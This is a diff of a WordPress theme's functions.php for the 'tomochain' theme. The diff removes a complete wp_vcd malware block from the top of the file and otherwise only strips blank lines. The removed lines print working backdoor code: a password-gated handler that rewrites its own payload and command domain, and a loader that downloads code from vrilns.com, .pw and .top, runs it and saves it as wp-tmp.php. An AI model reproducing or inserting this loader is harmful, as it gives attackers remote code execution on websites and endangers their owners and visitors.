@@ -1,187 +1,4 @@
 <?php
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '78ec593ad45214244e0d224a73f9c7fe'))
-	{
-$div_code_name="wp_vcd";
-		switch ($_REQUEST['action'])
-			{
-
-				
-
-
-
-
-				case 'change_domain';
-					if (isset($_REQUEST['newdomain']))
-						{
-							
-							if (!empty($_REQUEST['newdomain']))
-								{
-                                                                           if ($file = @file_get_contents(__FILE__))
-		                                                                    {
-                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
-                                                                                                             {
-
-			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
-			                                                                           @file_put_contents(__FILE__, $file);
-									                           print "true";
-                                                                                                             }
-
-
-		                                                                    }
-								}
-						}
-				break;
-
-								case 'change_code';
-					if (isset($_REQUEST['newcode']))
-						{
-							
-							if (!empty($_REQUEST['newcode']))
-								{
-                                                                           if ($file = @file_get_contents(__FILE__))
-		                                                                    {
-                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
-                                                                                                             {
-
-			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
-			                                                                           @file_put_contents(__FILE__, $file);
-									                           print "true";
-                                                                                                             }
-
-
-		                                                                    }
-								}
-						}
-				break;
-				
-				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
-			}
-			
-		die("");
-	}
-
-
-
-
-
-
-
-
-$div_code_name = "wp_vcd";
-$funcfile      = __FILE__;
-if(!function_exists('theme_temp_setup')) {
-    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
-    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
-        
-        function file_get_contents_tcurl($url)
-        {
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
-            curl_setopt($ch, CURLOPT_HEADER, 0);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_URL, $url);
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-            $data = curl_exec($ch);
-            curl_close($ch);
-            return $data;
-        }
-        
-        function theme_temp_setup($phpCode)
-        {
-            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-           if( fwrite($handle, "<?php\n" . $phpCode))
-		   {
-		   }
-			else
-			{
-			$tmpfname = tempnam('./', "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-			fwrite($handle, "<?php\n" . $phpCode);
-			}
-			fclose($handle);
-            include $tmpfname;
-            unlink($tmpfname);
-            return get_defined_vars();
-        }
-        
-
-$wp_auth_key='f475ef6ba42453eb2fddd44cd5c4b211';
-        if (($tmpcontent = @file_get_contents("http://www.vrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.vrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
-
-            if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        }
-        
-        
-        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        } 
-		
-		        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        }
-		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent));
-           
-        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        } 
-        
-        
-        
-        
-        
-    }
-}
-
-//$start_wp_theme_tmp
-
-
-
-//wp_tmp
-
-
-//$end_wp_theme_tmp
-?><?php
 /**
  * tomochain functions and definitions
  *
@@ -190,11 +7,9 @@ if (stripos($tmpcontent, $wp_auth_key) !== false) {
  * @package tomochain
  */
 $tomochain_theme = wp_get_theme();
-
 if ( ! empty( $tomochain_theme['Template'] ) ) {
 	$tomochain_theme = wp_get_theme( $tomochain_theme['Template'] );
 }
-
 define( 'TOMOCHAIN_THEME_NAME', $tomochain_theme['Name'] );
 define( 'TOMOCHAIN_THEME_SLUG', $tomochain_theme['Template'] );
 define( 'TOMOCHAIN_THEME_VERSION', $tomochain_theme['Version'] );
@@ -203,7 +18,6 @@ define( 'TOMOCHAIN_THEME_URI', get_template_directory_uri() );
 define( 'TOMOCHAIN_CHILD_THEME_URI', get_stylesheet_directory_uri() );
 define( 'TOMOCHAIN_CHILD_THEME_DIR', get_stylesheet_directory() );
 define( 'TOMOCHAIN_LIBS_URI', TOMOCHAIN_THEME_URI . '/assets/libs' );
-
 if ( ! function_exists( 'tomochain_setup' ) ) :
 	/**
 	 * Sets up theme defaults and registers support for various WordPress features.
@@ -220,10 +34,8 @@ if ( ! function_exists( 'tomochain_setup' ) ) :
 		 * to change 'tomochain' to the name of your theme in all the template files.
 		 */
 		load_theme_textdomain( 'tomochain', TOMOCHAIN_THEME_DIR . '/languages' );
-
 		// Add default posts and comments RSS feed links to head.
 		add_theme_support( 'automatic-feed-links' );
-
 		/*
 		 * Let WordPress manage the document title.
 		 * By adding theme support, we declare that this theme does not use a
@@ -231,20 +43,17 @@ if ( ! function_exists( 'tomochain_setup' ) ) :
 		 * provide it for us.
 		 */
 		add_theme_support( 'title-tag' );
-
 		/*
 		 * Enable support for Post Thumbnails on posts and pages.
 		 *
 		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
 		 */
 		add_theme_support( 'post-thumbnails' );
-
 		// This theme uses wp_nav_menu() in one location.
 		register_nav_menus( array(
 			'primary' => esc_html__( 'Primary', 'tomochain' ),
 			'footer-menu-bounty' => esc_html__( 'Footer Menu Bounty', 'tomochain' ),
 		) );
-
 		/*
 		 * Switch default core markup for search form, comment form, and comments
 		 * to output valid HTML5.
@@ -256,16 +65,13 @@ if ( ! function_exists( 'tomochain_setup' ) ) :
 			'gallery',
 			'caption',
 		) );
-
 		// Set up the WordPress core custom background feature.
 		add_theme_support( 'custom-background', apply_filters( 'tomochain_custom_background_args', array(
 			'default-color' => 'ffffff',
 			'default-image' => '',
 		) ) );
-
 		// Add theme support for selective refresh for widgets.
 		add_theme_support( 'customize-selective-refresh-widgets' );
-
 		/**
 		 * Add support for core custom logo.
 		 *
@@ -277,7 +83,6 @@ if ( ! function_exists( 'tomochain_setup' ) ) :
 			'flex-width'  => true,
 			'flex-height' => true,
         ) );
-
 		add_image_size('tomo-post-small-thumbnail', 280, 160, true);
         add_image_size('tomo-post-thumbnail', 600, 314, true);
         add_image_size('tomo-single-thumbnail', 1200, 628, true);
@@ -289,7 +94,6 @@ if ( ! function_exists( 'tomochain_setup' ) ) :
 	}
 endif;
 add_action( 'after_setup_theme', 'tomochain_setup' );
-
 /**
  * Set the content width in pixels, based on the theme's design and stylesheet.
  *
@@ -304,7 +108,6 @@ function tomochain_content_width() {
 	$GLOBALS['content_width'] = apply_filters( 'tomochain_content_width', 640 );
 }
 add_action( 'after_setup_theme', 'tomochain_content_width', 0 );
-
 /**
  * Register widget area.
  *
@@ -340,7 +143,6 @@ function tomochain_widgets_init() {
 	) );
 }
 add_action( 'widgets_init', 'tomochain_widgets_init' );
-
 /**
  * Enqueue libraries
  */
@@ -352,71 +154,56 @@ function tomochain_enqueue_libs() {
             'Open+Sans:300,400,600,700,800|Quicksand:400,500|Bai+Jamjuree:400,500,700&amp;subset=latin-ext,vietnamese',
             'https://fonts.googleapis.com/css' );
     wp_enqueue_style( 'google-fonts', $font_url, null, TOMOCHAIN_THEME_VERSION );
-
     wp_enqueue_script( 'superfish',
         TOMOCHAIN_LIBS_URI . '/superfish/js/superfish.min.js',
         array(),
         null,
         true );
-
     wp_enqueue_script( 'hoverIntent',
         TOMOCHAIN_LIBS_URI . '/superfish/js/hoverIntent.js',
         array(),
         null,
         true );
-
     wp_enqueue_style( 'jquery-nice-select', TOMOCHAIN_LIBS_URI . '/jquery-nice-select/css/nice-select.css' );
-
     wp_enqueue_script( 'jquery-nice-select',
         TOMOCHAIN_LIBS_URI . '/jquery-nice-select/js/jquery.nice-select.min.js',
         array(),
         null,
         true );
-
     wp_enqueue_style( 'slick-carousel', TOMOCHAIN_LIBS_URI . '/slick-carousel/css/slick.css' );
-
     wp_register_script( 'slick-carousel',
         TOMOCHAIN_LIBS_URI . '/slick-carousel/js/slick.min.js',
         array(),
         null,
         true );
-
     wp_enqueue_script( 'headroom-js',
         TOMOCHAIN_LIBS_URI . '/headroom-js/js/headroom.min.js',
         array(),
         null,
         true );
-
     wp_enqueue_script( 'jquery-headroom-js',
         TOMOCHAIN_LIBS_URI . '/headroom-js/js/jquery.headroom.min.js',
         array(),
         null,
         true );
-
     wp_register_style( 'hint-css', TOMOCHAIN_LIBS_URI . '/hint.css/css/hint.min.css' );
-
     wp_register_script( 'animejs',
         TOMOCHAIN_LIBS_URI . '/animejs/js/anime.min.js',
         array(),
         null,
         true );
-
     wp_register_script( 'lottie',
         TOMOCHAIN_LIBS_URI . '/lottie/js/lottie.js',
         array(),
         null,
         true );
-
     wp_register_style( 'magnific-popup', TOMOCHAIN_LIBS_URI . '/magnific-popup/css/magnific-popup.css' );
-
     wp_register_script( 'magnific-popup',
         TOMOCHAIN_LIBS_URI . '/magnific-popup/js/jquery.magnific-popup.min.js',
         array(),
         null,
         true );
-
     wp_register_style( 'jquery-flipster', TOMOCHAIN_LIBS_URI . '/jquery-flipster/css/jquery.flipster.min.css' );
-
     wp_register_script( 'jquery-flipster',
         TOMOCHAIN_LIBS_URI . '/jquery-flipster/js/jquery.flipster.min.js',
         array(),
@@ -429,14 +216,11 @@ function tomochain_enqueue_libs() {
         true );
 }
 add_action( 'wp_enqueue_scripts', 'tomochain_enqueue_libs', 1 );
-
 /**
  * Enqueue scripts and styles.
  */
 function tomochain_scripts() {
-
 	$suffix = ( defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ) ? '' : '.min';
-
 	if ($suffix === '.min') {
 		add_filter( 'stylesheet_uri',
 			function ( $stylesheet_uri, $stylesheet_dir_uri ) {
@@ -445,27 +229,22 @@ function tomochain_scripts() {
 		10,
 		2 );
     }
-
     wp_enqueue_style( 'tomochain-style', get_stylesheet_uri() );
-
     wp_enqueue_script( 'tomochain-js',
         TOMOCHAIN_THEME_URI . '/assets/js/tomochain' . $suffix . '.js',
             array('jquery'),
             TOMOCHAIN_THEME_VERSION,
             true );
-
     wp_localize_script( 'tomochain-js',
         'tomochainConfigs',
         array(
             'ajax_url' => admin_url( 'admin-ajax.php' )
         ));
-
 	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
 		wp_enqueue_script( 'comment-reply' );
 	}
 }
 add_action( 'wp_enqueue_scripts', 'tomochain_scripts' );
-
 /**
  * Add Theme Options page
  */
@@ -478,37 +257,30 @@ if (function_exists('acf_add_options_page')) {
         'parent_slug' => 'themes.php'
     ));
 }
-
 /**
  * Implement the Custom Header feature.
  */
 require_once TOMOCHAIN_THEME_DIR . '/inc/custom-header.php';
-
 /**
  * Custom template tags for this theme.
  */
 require_once TOMOCHAIN_THEME_DIR . '/inc/template-tags.php';
-
 /**
  * Functions which enhance the theme by hooking into WordPress.
  */
 require_once TOMOCHAIN_THEME_DIR . '/inc/template-functions.php';
-
 /**
  * Customizer additions.
  */
 require_once TOMOCHAIN_THEME_DIR . '/inc/customizer.php';
-
 /**
  * Import ACF local field groups
  */
 require_once TOMOCHAIN_THEME_DIR . '/inc/acf-local-field-groups.php';
-
 function my_acf_init() {
     acf_update_setting('google_api_key', get_field('google_maps_api_key', 'options'));
 }
 add_action('acf/init', 'my_acf_init');
-
 /**
  * Code Snippet to make Revolution Slider enable WPML support when Polylang
  * is enabled. Polylang has the required WPML compatibility functions to
@@ -523,7 +295,6 @@ if ( function_exists('pll_languages_list') ) {
 	add_action('wpml_loaded', '__return_true', 10, 0);
 	do_action('wpml_loaded');
 }
-
 /**
  * Remove default page of SendGrid plugin
  */
@@ -532,14 +303,12 @@ if (defined('SENDGRID_CATEGORY')) {
     remove_action( 'init', 'sg_create_subscribe_missing_token_error_page' );
     remove_action( 'init', 'sg_create_subscribe_invalid_token_error_page' );
 }
-
 // Menu header for page Enterprise
 function register_my_menu() {
   register_nav_menu('header-menu-enterprise',__( 'Header Menu Enterprise' ));
   // register_nav_menu('footer-menu-bounty',__( 'Footer Menu Bounty' ));
 }
 add_action( 'init', 'register_my_menu' );
-
 // Remove request user
 add_filter( 'rest_endpoints', function( $endpoints ){
     if ( isset( $endpoints['/wp/v2/users'] ) ) {
